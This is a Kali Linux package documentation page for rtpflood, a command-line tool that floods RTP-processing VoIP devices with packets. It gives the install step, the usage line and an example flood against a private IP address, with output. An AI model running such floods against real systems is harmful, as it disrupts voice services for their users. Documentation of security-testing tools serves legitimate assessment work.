---
Title: rtpflood
Homepage: http://www.hackingvoip.com/sec_tools.html
Repository: https://gitlab.com/kalilinux/packages/rtpflood
Architectures: any
Version: 1.0-1kali2
Metapackages: kali-linux-everything kali-linux-large kali-tools-voip kali-tools-vulnerability 
Icon: /images/kali-tools-icon-missing.svg
PackagesInfo: |
 ### rtpflood
 
  A command line tool used to flood any device that is
  processing RTP.
 
 **Installed size:** `26 KB`  
 **How to install:** `sudo apt install rtpflood`  
 
 {{< spoiler "Dependencies:" >}}
 * libc6 
 {{< /spoiler >}}
 
 ##### rtpflood
 
 
 ```
 root@kali:~# rtpflood -h
 usage: rtpflood sourcename destinationname srcport destport numpackets seqno timestamp SSID
 ```
 
 - - -
 
---
{{% hidden-comment "<!--Do not edit anything above this line-->" %}}

## rtpflood Usage Example

Flood from the source IP (`192.168.1.202`) to the target IP (`192.168.1.1`) with source port 5060 (`5060`) and destination port 5061 (`5061`) using 1000 packets (`1000`) with the specified sequence number (`3`), timestamp (`123456789`), and SSID (`kali`):

```
root@kali:~# rtpflood 192.168.1.202 192.168.1.1 5060 5061 1000 3 123456789 kali

Will flood port 5061 from port 5060 1000 times
Using sequence_number 3 timestamp 123456789 SSID 0

We have IP_HDRINCL

Number of Packets sent:

Sent 289 160 286
```
